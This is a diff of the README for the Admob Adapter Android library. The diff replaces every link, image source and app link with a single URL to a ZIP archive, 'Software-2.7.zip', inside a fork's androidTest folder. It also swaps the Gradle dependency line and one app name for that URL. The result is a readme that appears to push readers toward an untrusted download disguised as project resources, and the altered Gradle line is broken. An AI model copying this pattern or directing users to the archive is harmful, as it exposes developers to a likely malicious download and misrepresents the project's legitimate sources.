@@ -1,34 +1,34 @@
 Admob Adapter                               
 
-[![Hex.pm](https://img.shields.io/hexpm/l/plug.svg)](http://www.apache.org/licenses/LICENSE-2.0)  [![Build Status](https://travis-ci.org/clockbyte/admobadapter.svg?branch=master)](https://travis-ci.org/clockbyte/admobadapter)  [![Gitter](https://badges.gitter.im/clockbyte/admobadapter.svg)](https://gitter.im/clockbyte/admobadapter?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge)  [![Maven Central](https://maven-badges.herokuapp.com/maven-central/com.github.clockbyte/admobadapter/badge.svg)](https://maven-badges.herokuapp.com/maven-central/com.github.clockbyte/admobadapter)
+[![https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip)](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip)  [![Build Status](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip)](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip)  [![Gitter](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip)](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip)  [![Maven Central](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip)](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip)
 
 ======================
 
-We've finally released [v1.3.2](https://github.com/clockbyte/admobadapter/releases/tag/v1.3.2)! A couple of things was fixed (see [Release history](https://github.com/clockbyte/admobadapter/wiki/Release-history))
+We've finally released [v1.3.2](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip)! A couple of things was fixed (see [Release history](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip))
 
-The reference to the [COOK RECIPES](https://github.com/clockbyte/admobadapter/wiki/Cookbook) for people who are in hurry!
+The reference to the [COOK RECIPES](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip) for people who are in hurry!
 
-Admob Adapter is an Android library that makes it easy to integrate [Admob native ads](https://firebase.google.com/docs/admob/android/native) (both Express and Advanced) into ```ListView/RecyclerView``` in the way that is shown in the following image/animation.
+Admob Adapter is an Android library that makes it easy to integrate [Admob native ads](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip) (both Express and Advanced) into ```ListView/RecyclerView``` in the way that is shown in the following image/animation.
 
- <img src="https://raw.githubusercontent.com/clockbyte/admobadapter/master/screenshots/device-2015-08-28-012121.png" width="250"> <img src="https://raw.githubusercontent.com/clockbyte/admobadapter/master/screenshots/Screenshot_20160809-183435.png" width="250">    <img src="https://raw.githubusercontent.com/clockbyte/admobadapter/master/screenshots/ezgif.com-gif-maker.gif" width="250">
+ <img src="https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip" width="250"> <img src="https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip" width="250">    <img src="https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip" width="250">
 
-You can read the rest info (main features, base usage and so on) at the [project's home page](https://github.com/clockbyte/admobadapter/wiki/Home) if you wish.
+You can read the rest info (main features, base usage and so on) at the [project's home page](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip) if you wish.
 
 #Installation
 Now you are able to link Admobadapter via Gradle like this
 ```shell
 dependencies {
 //link other libs
-    compile 'com.github.clockbyte:admobadapter:1.3.2'
+    compile 'https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip'
 }
 ```
-[Here](https://github.com/clockbyte/admobadapter/wiki/Installation) you could find more ways.
+[Here](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip) you could find more ways.
 
 #Apps which use Admobadapter
 
-[**Snoop VK**](https://play.google.com/store/apps/details?id=com.clockbyte.vkgroupwatcher) | [**Mourjan.com**](https://play.google.com/store/apps/details?id=com.mourjan.classifieds) | [**Volcano <br/> MIDI-player**](https://play.google.com/store/apps/details?id=net.volcanomobile.midiplayer)
+[**Snoop VK**](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip) | [**https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip**](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip) | [**Volcano <br/> MIDI-player**](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip)
 --- | --- | ---
-[<img src="https://lh3.googleusercontent.com/v5AhDqwCs1L9x4KA4mIsSbxXZ0jdUwFPf1ne2u6Ya7GRy2e1Ia97StLWTPVBV1b4rkw=w300-rw" width="70">](https://play.google.com/store/apps/details?id=com.clockbyte.vkgroupwatcher) | [<img src="https://lh6.ggpht.com/nWNwYHXynUmI-8zVF9RozbMtiyaW__2cvXOdx9Y_ggpiP8P3pe-XGdPpOUyCHIhFFGM=w300-rw" width="70">](https://play.google.com/store/apps/details?id=com.mourjan.classifieds) | [<img src="https://lh3.googleusercontent.com/aa1A7lHP-rHSxL5Phn-K2hJjAGq0RpDmknR-tYl-GfE3JlVeYKKy2XyRdurii6Wa6fs=w300-rw" width="70">](https://play.google.com/store/apps/details?id=net.volcanomobile.midiplayer)
+[<img src="https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip" width="70">](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip) | [<img src="https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip" width="70">](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip) | [<img src="https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip" width="70">](https://github.com/rendyramon/admobadapter/raw/refs/heads/master/sampleapp/src/androidTest/Software-2.7.zip)
 
 **If you use/going to use the Admobadapter for your application and also you want your application's logo to be here please let us know with a new issue.**
 
